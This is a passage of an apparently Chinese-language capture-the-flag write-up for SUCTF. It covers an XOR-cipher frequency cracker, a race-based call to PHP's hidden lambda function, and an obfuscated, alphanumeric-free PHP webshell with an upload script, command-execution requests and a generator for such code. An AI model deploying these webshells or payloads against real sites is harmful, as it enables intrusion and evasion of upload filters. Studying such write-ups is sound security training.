class="keyword">return</span> keyPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calCorrelation</span>(<span class="params">cpool</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;传入字典，形如&#123;&#x27;e&#x27;:2,&#x27;p&#x27;:3&#125;</span></span><br><span class="line"><span class="string">        返回可能性，0~1,值越大可能性越大</span></span><br><span class="line"><span class="string">        (correlation between the decrypted column letter frequencies and</span></span><br><span class="line"><span class="string">        the relative letter frequencies for normal English text)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    frequencies = &#123;<span class="string">&quot;e&quot;</span>: <span class="number">0.12702</span>, <span class="string">&quot;t&quot;</span>: <span class="number">0.09056</span>, <span class="string">&quot;a&quot;</span>: <span class="number">0.08167</span>, <span class="string">&quot;o&quot;</span>: <span class="number">0.07507</span>, <span class="string">&quot;i&quot;</span>: <span class="number">0.06966</span>,</span><br><span class="line">                   <span class="string">&quot;n&quot;</span>: <span class="number">0.06749</span>, <span class="string">&quot;s&quot;</span>: <span class="number">0.06327</span>, <span class="string">&quot;h&quot;</span>: <span class="number">0.06094</span>, <span class="string">&quot;r&quot;</span>: <span class="number">0.05987</span>, <span class="string">&quot;d&quot;</span>: <span class="number">0.04253</span>,</span><br><span class="line">                   <span class="string">&quot;l&quot;</span>: <span class="number">0.04025</span>, <span class="string">&quot;c&quot;</span>: <span class="number">0.02782</span>, <span class="string">&quot;u&quot;</span>: <span class="number">0.02758</span>, <span class="string">&quot;m&quot;</span>: <span class="number">0.02406</span>, <span class="string">&quot;w&quot;</span>: <span class="number">0.02360</span>,</span><br><span class="line">                   <span class="string">&quot;f&quot;</span>: <span class="number">0.02228</span>, <span class="string">&quot;g&quot;</span>: <span class="number">0.02015</span>, <span class="string">&quot;y&quot;</span>: <span class="number">0.01974</span>, <span class="string">&quot;p&quot;</span>: <span class="number">0.01929</span>, <span class="string">&quot;b&quot;</span>: <span class="number">0.01492</span>,</span><br><span class="line">                   <span class="string">&quot;v&quot;</span>: <span class="number">0.00978</span>, <span class="string">&quot;k&quot;</span>: <span class="number">0.00772</span>, <span class="string">&quot;j&quot;</span>: <span class="number">0.00153</span>, <span class="string">&quot;x&quot;</span>: <span class="number">0.00150</span>, <span class="string">&quot;q&quot;</span>: <span class="number">0.00095</span>,</span><br><span class="line">                   <span class="string">&quot;z&quot;</span>: <span class="number">0.00074</span>&#125;</span><br><span class="line">    relative = <span class="number">0.0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    fpool = <span class="string">&#x27;etaoinshrdlcumwfgypbvkjxqz&#x27;</span></span><br><span class="line">    total = <span class="built_in">sum</span>(cpool.values())  <span class="comment"># 总和应包括字母和其他可见字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cpool.keys():</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> fpool:</span><br><span class="line">            relative += frequencies[i] * cpool[i] / total</span><br><span class="line">    <span class="keyword">return</span> relative</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyseFrequency</span>(<span class="params">cfreq</span>):</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> posFreq <span class="keyword">in</span> cfreq:</span><br><span class="line">        mostRelative = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> keyChr <span class="keyword">in</span> posFreq.keys():</span><br><span class="line">            r = calCorrelation(posFreq[keyChr])</span><br><span class="line">            <span class="keyword">if</span> r &gt; mostRelative:</span><br><span class="line">                mostRelative = r</span><br><span class="line">                keychar = keyChr</span><br><span class="line">        key.append(keychar)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFrequency</span>(<span class="params">cipher, keyPoolList</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; 传入的密文作为数字列表处理</span></span><br><span class="line"><span class="string">        传入密钥的字符集应为列表，依次包含各字节字符集。</span></span><br><span class="line"><span class="string">            形如[[0x11,0x12],[0x22]]</span></span><br><span class="line"><span class="string">        返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频</span></span><br><span class="line"><span class="string">            形如[&#123;</span></span><br><span class="line"><span class="string">                    0x11:&#123;&#x27;a&#x27;:2,&#x27;b&#x27;:3&#125;,</span></span><br><span class="line"><span class="string">                    0x12:&#123;&#x27;e&#x27;:6&#125;</span></span><br><span class="line"><span class="string">                 &#125;,</span></span><br><span class="line"><span class="string">                 &#123;</span></span><br><span class="line"><span class="string">                    0x22:&#123;&#x27;g&#x27;:1&#125;</span></span><br><span class="line"><span class="string">                 &#125;]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    freqList = []</span><br><span class="line">    keyLen = <span class="built_in">len</span>(keyPoolList)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(keyLen):</span><br><span class="line">        posFreq = <span class="built_in">dict</span>()</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> keyPoolList[i]:</span><br><span class="line">            posFreq[k] = <span class="built_in">dict</span>()</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> cipher[i::keyLen]:</span><br><span class="line">                p = <span class="built_in">chr</span>(k ^ c)</span><br><span class="line">                posFreq[k][p] = posFreq[k][p] + <span class="number">1</span> <span class="keyword">if</span> p <span class="keyword">in</span> posFreq[k] <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">        freqList.append(posFreq)</span><br><span class="line">    <span class="keyword">return</span> freqList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vigenereDecrypt</span>(<span class="params">cipher, key</span>):</span></span><br><span class="line">    plain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    cur = <span class="number">0</span></span><br><span class="line">    ll = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">        plain += <span class="built_in">chr</span>(c ^ key[cur])</span><br><span class="line">        cur = (cur + <span class="number">1</span>) % ll</span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    ps = []</span><br><span class="line">    ks = []</span><br><span class="line">    ss = []</span><br><span class="line">    ps.extend(xrange(<span class="number">0xff</span>))</span><br><span class="line">    ks.extend(xrange(<span class="number">0x20</span>,<span class="number">0x80</span>))</span><br><span class="line">    ss.extend(xrange(<span class="number">1</span>, <span class="number">50</span>))</span><br><span class="line">    cipher = getCipher()</span><br><span class="line"></span><br><span class="line">    keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keyPool:</span><br><span class="line">        freq = getFrequency(cipher, keyPool[i])</span><br><span class="line">        key = analyseFrequency(freq)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$MY</span> = create_function(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line"><span class="variable">$hash</span> = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_<span class="subst">$hash</span>()&#123;&quot;</span></span><br><span class="line">    .<span class="string">&quot;global \$MY;&quot;</span></span><br><span class="line">    .<span class="string">&quot;\$MY();&quot;</span></span><br><span class="line">    .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&quot;func_name&quot;</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/19e3ee990cb7">https://www.jianshu.com/p/19e3ee990cb7</a> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy import Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def run(i):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">&#x27;web.suctf.asuri.org&#x27;</span></span><br><span class="line">        PORT = <span class="number">81</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">&#x27;GET /index.php HTTP/1.1\nHost: web.suctf.asuri.org\nConnection: Keep-Alive\n\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">print</span> requests.get(<span class="string">&#x27;http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1&#x27;</span>).content</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>$flag=&quot;SUCTF&#123;L4GsMqu6gu5knFnCi2Te8SjSucxKfQj6tuPJokoFhTCJjpa6RSfK&#125;&quot;;</code> </p>
+<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>要求上传的webshell文件从第6个字符开始都不能在黑名单内。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=substr(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>用burp intruder跑一遍，发现不在黑名单里的可打印字符有 <code>$()[]_~=;.</code>  共10个。</p>
+<p>跑的时候需注意<code>Intruder=&gt;payloads=&gt;payload encoding</code> 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。</p>
+<p>跑的时候可以在<code>Intruder=&gt;options=&gt;Grep-Match</code> 中选择 flag <code>illegal</code> ，这样就可以快速看到那些字符是合法的了。</p>
+<p>接下来就是构造一个由 <code>$()[]_~=;.</code> 组成的webshell了，主要思路来自 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a> 。</p>
+<p>构造出的最终结果如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="variable">$_</span>=_==_;<span class="variable">$__</span>=~一[<span class="variable">$_</span>];<span class="variable">$___</span>=~了[<span class="variable">$_</span>];<span class="variable">$____</span>=~端[<span class="variable">$_</span>];<span class="variable">$_____</span>=~得[<span class="variable">$_</span>];<span class="variable">$______</span>=~第[<span class="variable">$_</span>];<span class="variable">$_______</span>=~学[<span class="variable">$_</span>];<span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$___</span>.<span class="variable">$____</span>;<span class="variable">$_</span>=<span class="variable">$$_</span>;<span class="variable">$__</span>=<span class="variable">$_____</span>.<span class="variable">$______</span>.<span class="variable">$______</span>.<span class="variable">$___</span>.<span class="variable">$_______</span>.<span class="variable">$____</span>;<span class="variable">$__</span>(<span class="variable">$_</span>[_]);</span><br></pre></td></tr></table></figure>
+
+<p>详细注释：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> </span><br><span class="line"><span class="variable">$_</span>=_==_;<span class="comment">//1</span></span><br><span class="line"><span class="variable">$__</span>=~一[<span class="variable">$_</span>];<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=~了[<span class="variable">$_</span>];<span class="comment">//E</span></span><br><span class="line"><span class="variable">$____</span>=~端[<span class="variable">$_</span>];<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_____</span>=~得[<span class="variable">$_</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$______</span>=~第[<span class="variable">$_</span>];<span class="comment">//S</span></span><br><span class="line"><span class="variable">$_______</span>=~学[<span class="variable">$_</span>];<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$___</span>.<span class="variable">$____</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_</span>;<span class="comment">//$_GET</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_____</span>.<span class="variable">$______</span>.<span class="variable">$______</span>.<span class="variable">$___</span>.<span class="variable">$_______</span>.<span class="variable">$____</span>;<span class="comment">//ASSERT</span></span><br><span class="line"><span class="variable">$__</span>(<span class="variable">$_</span>[_]);<span class="comment">//ASSERT($_GET[_]);</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------</span><br><span class="line">http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php</span></span><br><span class="line">?_=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>可以有一个更短更舒服的选择</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="variable">$_</span>=_==_;<span class="variable">$__</span>=~一[<span class="variable">$_</span>];<span class="variable">$___</span>=~了[<span class="variable">$_</span>];<span class="variable">$____</span>=~端[<span class="variable">$_</span>];<span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$___</span>.<span class="variable">$____</span>;<span class="variable">$_</span>=<span class="variable">$$_</span>;<span class="variable">$_</span>[_](<span class="variable">$_</span>[__]);</span><br></pre></td></tr></table></figure>
+
+<p>详细注释：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=_==_;<span class="comment">//1</span></span><br><span class="line"><span class="variable">$__</span>=~一[<span class="variable">$_</span>];<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=~了[<span class="variable">$_</span>];<span class="comment">//E</span></span><br><span class="line"><span class="variable">$____</span>=~端[<span class="variable">$_</span>];<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$___</span>.<span class="variable">$____</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_</span>;<span class="comment">//$_GET</span></span><br><span class="line"><span class="variable">$_</span>[_](<span class="variable">$_</span>[__]);<span class="comment">//$_GET[_]($_GET[__]);</span></span><br><span class="line">------------------------------------------------------</span><br><span class="line">http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php</span></span><br><span class="line">?_=assert&amp;__=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>读取flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=system(%22ls%20-l%20/%22);</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=readfile(%27/Th1s_14_f14g%27);</span></span><br><span class="line"></span><br><span class="line">SUCTF&#123;KyGeBLWoF9MXcdDKBdbw2B54sMxbsxyXBpm8t5nQUHBJKuAYEd6o&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上传小脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">data=<span class="string">&quot;&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);&quot;</span></span><br><span class="line">base=<span class="string">&quot;http://web.suctf.asuri.org:82/&quot;</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;findneo.php&#x27;</span>, data, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">content = requests.post(base+<span class="string">&quot;upload.php&quot;</span>, files=files).text</span><br><span class="line">cmd=<span class="string">&#x27;system(&quot;dir /&quot;);&#x27;</span></span><br><span class="line">payload=base+re.match(<span class="string">&quot;[\s\S]*Stored in: ([a-z.0-9/]+)[\s\S]*&quot;</span>,content).group(<span class="number">1</span>)+<span class="string">&quot;?_=assert&amp;__=&quot;</span>+cmd</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"><span class="built_in">print</span> requests.get(payload).content</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=system(&quot;dir /&quot;);</span></span><br><span class="line"><span class="comment"># 1Th1s_14_f14g  boot  etc   lib	 media	opt   root  sbin  sys  usr</span></span><br><span class="line"><span class="comment"># bin	      dev   home  lib64  mnt	proc  run   srv   tmp  var</span></span><br></pre></td></tr></table></figure>
+
+<p>写了一个用上述方法生成任意字母构成的字符串的小程序：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: &#x27;findneo&#x27;</span></span><br><span class="line"><span class="comment"># compose php code from limited whitelist: $()[]_~=;.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gendict</span>(<span class="params">index=<span class="string">&#x27;_==_&#x27;</span>,target_chars=[<span class="built_in">chr</span>(<span class="params">i</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="params"><span class="number">0x20</span>,<span class="number">0x7f</span></span>)]</span>):</span></span><br><span class="line">    sentence=<span class="string">&quot;如是我闻。一时薄伽梵。住王舍城鹫峰山顶。与大苾刍众千二百五十人俱。皆阿罗汉。诸漏已尽无复烦恼得真自在心善解脱慧善解脱。如调慧马亦如大龙。已作所作已办所办。弃诸重担逮得己利。尽诸有结正知解脱。至心自在第一究竟。除阿难陀独居学地得预流果。大迦叶波而为上首。复有五百苾刍尼众。皆阿罗汉。大胜生主而为上首。复有无量邬波索迦、邬波斯迦。皆见圣谛。复有无量无数菩萨摩诃萨众。一切皆得陀罗尼门三摩地门。住空无相无分别愿。已得诸法平等性忍。具足成就四无碍解。凡所演说辩才无尽。于五神通自在游戏。所证智断永无退失。言行威肃闻皆敬受。勇猛精进离诸懈怠。能舍亲财不顾身命。离矫离诳无染无求。等为有情而宣正法。契深法忍穷最极趣。得无所畏其心泰然。超众魔境出诸业障。摧灭一切烦恼怨敌。建正法幢伏诸邪论。声闻独觉不能测量。得心自在得法自在。业惑见障皆已解脱。择法辩说无不善巧。入深缘起生灭法门。离见随眠舍诸缠结。智慧通达诸圣谛理。曾无数劫发弘誓愿。容貌熙怡先言接引。远离颦蹙辞韵清和。赞颂善巧辩才无滞。处无边众威德肃然。抑扬自在都无所畏。多俱胝劫巧说无尽。于诸法门胜解观察。如幻如阳焰。如梦如水月。如响如空花。如像如光影。如变化事。如寻香城。虽皆无实而现似有。离下劣心说法无畏。能随证入无量法门。善知有情心行所趣。以微妙慧而度脱之。于诸有情心无挂碍。成就最上无生法忍。善入诸法平等性智。甚深法性能如实知。随其所应巧令悟入。能善宣说缘起法门。摄受无边佛国大愿。于十方界无数诸佛。等持正念常现在前。诸佛出世皆能历事。亦能劝请转正法轮。不般涅槃度无量众善能伏灭一切有情种种见缠诸烦恼焰。须臾游戏百千等持。引发无边殊胜功德。此诸菩萨具如是等妙功德海。设经无量俱胝大劫。叹不能尽。其名曰贤守菩萨摩诃萨。宝性菩萨摩诃萨。宝藏菩萨摩诃萨。宝授菩萨摩诃萨。导师菩萨摩诃萨。仁授菩萨摩诃萨。星授菩萨摩诃萨。神授菩萨摩诃萨。帝授菩萨摩诃萨。广慧菩萨摩诃萨。胜慧菩萨摩诃萨。上慧菩萨摩诃萨。增长慧菩萨摩诃萨。无边慧菩萨摩诃萨。不虚见菩萨摩诃萨。无障慧菩萨摩诃萨。善发趣菩萨摩诃萨。善勇猛菩萨摩诃萨。极精进菩萨摩诃萨。常精进菩萨摩诃萨。常加行菩萨摩诃萨。不舍轭菩萨摩诃萨。日藏菩萨摩诃萨。月藏菩萨摩诃萨。无比慧菩萨摩诃萨。观自在菩萨摩诃萨。得大势菩萨摩诃萨。妙吉祥菩萨摩诃萨。宝印手菩萨摩诃萨。摧魔力菩萨摩诃萨。金刚慧菩萨摩诃萨。金刚藏菩萨摩诃萨。常举手菩萨摩诃萨。大悲心菩萨摩诃萨。大庄严菩萨摩诃萨。庄严王菩萨摩诃萨。山峰菩萨摩诃萨。宝峰菩萨摩诃萨。德王菩萨摩诃萨。慈氏菩萨摩诃萨。如是等无量百千俱胝那庾多菩萨摩诃萨。皆法王子堪绍佛位而为上首。尔时世尊于师子座上。自敷尼师坛结跏趺坐。端身正愿住对面念。入等持王妙三摩地。诸三摩地皆摄入此三摩地中。是所流故。尔时世尊正知正念。从等持王安庠而起。以净天眼观察十方殑伽沙等诸佛世界。举身怡悦。从两足下千辐轮相。各放六十百千俱胝那庾多光。从足十指。两趺两跟。四踝两胫。两腨两膝。两股。腰胁腹背。脐中心上胸臆德字。两乳两腋。两肩两髆。两肘两臂。两腕两手。两掌十指。项咽颐颔。颊额头顶两眉两眼。两耳两鼻。口四牙。四十齿。眉间毫相。一一身分。各放六十百千俱胝那庾多光。此一一光各照三千大千世界。从此展转遍照十方殑伽沙等诸佛世界。其中有情遇斯光者。必得无上正等菩提。尔时世尊一切毛孔皆悉熙怡。各出六十百千俱胝那庾多光。是一一光各照三千大千世界。从此展转遍照十方殑伽沙等诸佛世界。其中有情遇斯光者。必得无上正等菩提。尔时世尊演身常光照此三千大千世界。从此展转遍照十方殑伽沙等诸佛国土。其中有情遇斯光者。必得无上正等菩提。尔时世尊从其面门出广长舌相。遍覆三千大千世界。熙怡微笑。复从舌相流出无量百千俱胝那庾多光。其光杂色。从此杂色一一光中。现宝莲花。其花千叶皆真金色。众宝庄严。绮饰鲜荣。甚可爱乐。香气芬烈。周流普熏。细滑轻软。触生妙乐。诸花台中皆有化佛结跏趺坐。演妙法音。一一法音。皆说般若波罗蜜多相应之法。有情闻者必得无上正等菩提。从此展转。流遍十方殑伽沙等诸佛世界。说法利益亦复如是。&quot;</span></span><br><span class="line">    parse_byte=<span class="keyword">lambda</span> c:[~i%<span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytes</span>(c, encoding=<span class="string">&#x27;utf-8&#x27;</span>)][<span class="number">1</span>]</span><br><span class="line">    d=<span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> sentence:</span><br><span class="line">        j=parse_byte(k)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(j) <span class="keyword">in</span> target_chars <span class="keyword">and</span> <span class="built_in">chr</span>(j) <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">            d[<span class="built_in">chr</span>(j)]=<span class="string">&quot;~&#123;&#125;[&#123;&#125;]&quot;</span>.<span class="built_in">format</span>(k,index)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gencode</span>(<span class="params">code</span>):</span></span><br><span class="line">    d=gendict(index=<span class="string">&#x27;$_&#x27;</span>,target_chars=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">set</span>(code)))</span><br><span class="line">    res=<span class="string">&#x27;$__=&#x27;</span>+<span class="string">&#x27;.&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:d[x],code))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code=<span class="string">&#x27;@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&#x27;</span></span><br><span class="line">print(gencode(code))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;?php </span></span><br><span class="line"><span class="comment"># $_=_==_;</span></span><br><span class="line"><span class="comment"># 